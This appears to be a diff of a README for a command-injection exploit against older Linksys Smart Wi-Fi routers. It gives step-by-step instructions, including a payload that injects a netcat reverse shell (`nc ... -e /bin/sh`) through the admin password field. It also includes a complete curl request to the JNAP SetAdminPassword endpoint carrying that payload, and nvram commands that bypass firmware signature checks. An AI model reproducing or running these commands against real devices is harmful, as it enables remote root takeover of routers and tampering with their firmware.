@@ -2,10 +2,8 @@
 # Linksys-Router-RCE
 A exploit for older Linksys Smart Wi-Fi routers that's able to get root shell access and unsigned firmware (like OpenWRT) with just the web admin login.
 
-
 ## IMPORTANT:
 This exploit was discovered by IOActive and patched in 2017 (It's still possible to downgrade the firmware from the web interface though) but since they never released a PoC I used AI to look through my vulnerable firmware I extracted and it found the exploit. (Only the exploit was found with AI but this writing is not AI generated)
-
 
 ### ALSO I'M NOT RESPONSIBLE FOR ANY DAMAGED ROUTERS, UNAUTHORIZED TAMPERING, OR ANY OTHER DAMAGES CAUSED FROM THIS EXPLOIT
 
@@ -18,7 +16,7 @@ If you have a vulnerable router model (You can check with the list [here](https:
 ### If you can't find it, try going into the CA web interface then try again.
 
 # Doing the exploit:
-### This was done on Linux so don't complain if it says "command not found" or something like that on Windows
+### This was done on Linux so don't complain if it gives errors on Windows.
 
 ## Web interface method (recommended):
 ### Make sure you have the following noted:
@@ -39,7 +37,7 @@ If you have a vulnerable router model (You can check with the list [here](https:
 
     admin\`nc 192.168.1.119 4444 -e /bin/sh\`
     
-### (make sure to change 192.168.1.119 to your PCs local IP)
+### (make sure to change "192.168.1.119" to your PCs local IP)
 ### If the netcat listener connects but shows no text output, that means it's working but it only outputs text when you run a command.
 
 
@@ -74,11 +72,11 @@ If you have a vulnerable router model (You can check with the list [here](https:
 ### In a 2nd shell run the exploit (make sure to change the information to what you have):
 
     curl -X POST http://192.168.1.1/JNAP/ -H "Content-Type: application/json" -H "X-JNAP-Action: http://linksys.com/jnap/core/SetAdminPassword" -H "X-JNAP-Authorization: Basic YWRtaW46YWRtaW4=" -d '{"adminPassword": "admin`nc 192.168.1.119 4444 -e /bin/sh`"}' 
-#### In this command it changes the admin password to a malicious one that runs `nc 192.168.1.119 4444 -e /bin/sh` using the example JNAP token 
+#### In this command, it changes the admin password to a malicious one that runs `nc 192.168.1.119 4444 -e /bin/sh` using the example JNAP token for authentication
 ###  If the netcat listener connects but shows no text output, that means it's working but it only outputs text when you run a command.
 
-## Running unsigned firmware (for US model routers only)
-### If your router requires firmware to be signed (like the US model Linksys EA9400/EA9500) but you don't want to use a serial connection you can run in your routers root shell the following:
+# Running unsigned firmware (for US model routers only)
+### If your router requires firmware to be signed (like the US model Linksys EA9400/EA9500), but you don't want to use a serial connection, you can run in your routers root shell the following:
 
     nvram set cert_region=EU
     nvram commit
